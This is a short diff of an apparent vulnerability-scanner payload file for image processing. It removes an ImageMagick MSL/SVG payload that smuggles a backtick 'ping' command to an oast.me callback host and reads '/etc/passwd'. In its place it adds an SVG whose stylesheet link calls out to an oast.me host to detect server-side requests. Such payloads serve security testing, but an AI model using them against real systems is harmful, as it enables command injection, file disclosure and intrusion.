@@ -1,9 +1,5 @@
-<image authenticate='ff" `ping cnbfvq8uaek6bb2pvaognnwzphhkgo43p.oast.me`;"'>
-  <read filename="pdf:/etc/passwd"/>
-  <get width="base-width" height="base-height" />
-  <resize geometry="400x400" />
-  <write filename="test.png" />
-  <svg width="700" height="700" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">       
-  <image xlink:href="msl:poc.svg" height="100" width="100"/>
-  </svg>
-</image>
+<?xml version="1.0" standalone="no"?>
+<?xml-stylesheet type="text/css" href="https://cnbg9dguaek1to2glsgg81rg7h7z1bu7f.oast.me"?>
+<svg xmlns:svg="http://www.w3.org/2000/svg" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" style="overflow: hidden; position: relative;" width="300" height="200">
+<rect x="0" y="150" height="10" width="300" style="fill: black"/>
+</svg>
